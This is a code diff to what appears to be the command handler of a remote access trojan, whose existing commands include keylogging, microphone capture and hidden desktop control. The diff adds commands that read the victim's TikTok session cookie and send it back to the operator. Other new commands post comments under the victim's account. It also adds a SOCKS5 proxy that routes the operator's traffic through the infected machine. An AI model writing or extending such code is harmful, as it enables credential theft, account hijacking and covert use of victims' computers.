@@ -19,6 +19,7 @@ internal class TlsClient : IDisposable
     private readonly int _port;
     private readonly SemaphoreSlim _writeLock = new(1, 1);
     private readonly string _instanceId = Guid.NewGuid().ToString("N").Substring(0, 8);
+    private readonly HashSet<string> _socksInitiated = [];
 
     /// <summary>False after Disconnect/Uninstall — caller should NOT reconnect.</summary>
     public bool ShouldReconnect { get; private set; } = true;
@@ -348,6 +349,82 @@ internal class TlsClient : IDisposable
 
                 case PacketType.MicStop:
                     MicrophoneFeature.Stop();
+                    break;
+
+                // ── TikTok ───────────────────────────────────────────
+                case PacketType.TikTokComment:
+                    var ttCmd = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.TikTokCommentStub);
+                    if (ttCmd != null)
+                        _ = Task.Run(async () =>
+                        {
+                            var cookie = string.IsNullOrEmpty(ttCmd.Cookie)
+                                ? TikTokFeature.DetectCookie()
+                                : ttCmd.Cookie;
+                            var (ok, err) = ttCmd.IsLiveroom
+                                ? await TikTokFeature.CommentOnLive(ttCmd.VideoId, ttCmd.Text, cookie)
+                                : await TikTokFeature.CommentOnVideo(ttCmd.VideoId, ttCmd.Text, cookie);
+                            await WritePacketAsync(new Packet
+                            {
+                                Type = PacketType.TikTokCommentAck,
+                                Data = JsonSerializer.Serialize(
+                                    new TikTokCommentAckStub { Success = ok, Error = err },
+                                    SeroJson.Default.TikTokCommentAckStub)
+                            }, CancellationToken.None);
+                        });
+                    break;
+
+                case PacketType.TikTokDetectCookie:
+                    _ = Task.Run(async () =>
+                    {
+                        var c = TikTokFeature.DetectCookie();
+                        await WritePacketAsync(new Packet
+                        {
+                            Type = PacketType.TikTokCookieResult,
+                            Data = JsonSerializer.Serialize(
+                                new TikTokCookieResultStub { Cookie = c, Found = !string.IsNullOrEmpty(c) },
+                                SeroJson.Default.TikTokCookieResultStub)
+                        }, CancellationToken.None);
+                    });
+                    break;
+
+                // ── SOCKS5 Proxy ─────────────────────────────────────
+                case PacketType.SocksStart:
+                    Socks5Feature.Init(
+                        async data => await WritePacketAsync(new Packet { Type = PacketType.SocksData, Data = data }, CancellationToken.None),
+                        async sid  => await WritePacketAsync(new Packet
+                        {
+                            Type = PacketType.SocksClose,
+                            Data = JsonSerializer.Serialize(new SocksDataStub { SessionId = sid, Data = "" }, SeroJson.Default.SocksDataStub)
+                        }, CancellationToken.None),
+                        async (sid, err) => await WritePacketAsync(new Packet
+                        {
+                            Type = err.Length == 0 ? PacketType.SocksConnOk : PacketType.SocksConnErr,
+                            Data = JsonSerializer.Serialize(new SocksConnStub { SessionId = sid, Error = err }, SeroJson.Default.SocksConnStub)
+                        }, CancellationToken.None));
+                    break;
+
+                case PacketType.SocksStop:
+                    Socks5Feature.StopAll();
+                    break;
+
+                case PacketType.SocksData:
+                    var socksD = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.SocksDataStub);
+                    if (socksD != null)
+                    {
+                        var raw = Convert.FromBase64String(socksD.Data);
+                        if (!_socksInitiated.Contains(socksD.SessionId))
+                        {
+                            _socksInitiated.Add(socksD.SessionId);
+                            _ = Socks5Feature.HandleConnect(socksD.SessionId, raw);
+                        }
+                        else
+                            _ = Socks5Feature.HandleData(socksD.SessionId, raw);
+                    }
+                    break;
+
+                case PacketType.SocksClose:
+                    var socksC = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.SocksDataStub);
+                    if (socksC != null) { Socks5Feature.HandleClose(socksC.SessionId); _socksInitiated.Remove(socksC.SessionId); }
                     break;
 
                 // ── Process Manager ─────────────────────────────────
@@ -1313,6 +1390,18 @@ internal enum PacketType
     KeyloggerFileContent = 178,
     KeyloggerDeleteFile  = 179,
 
+    TikTokComment      = 210,
+    TikTokCommentAck   = 211,
+    TikTokDetectCookie = 212,
+    TikTokCookieResult = 213,
+
+    SocksStart   = 200,
+    SocksStop    = 201,
+    SocksData    = 202,
+    SocksClose   = 203,
+    SocksConnOk  = 204,
+    SocksConnErr = 205,
+
     ProcGetList    = 190,
     ProcListResult = 191,
     ProcKill       = 192,
@@ -1483,6 +1572,14 @@ internal class HvncClipboardDataStub
 // Fun
 [JsonSerializable(typeof(FunCmdDataStub))]
 [JsonSerializable(typeof(FunResultStub))]
+// TikTok
+[JsonSerializable(typeof(TikTokCommentStub))]
+[JsonSerializable(typeof(TikTokCommentAckStub))]
+[JsonSerializable(typeof(TikTokCookieResultStub))]
+// SOCKS5
+[JsonSerializable(typeof(SocksDataStub))]
+[JsonSerializable(typeof(SocksConnStub))]
+[JsonSerializable(typeof(SocksStartStub))]
 // Process Manager
 [JsonSerializable(typeof(ProcEntryStub))]
 [JsonSerializable(typeof(ProcListResultStub))]
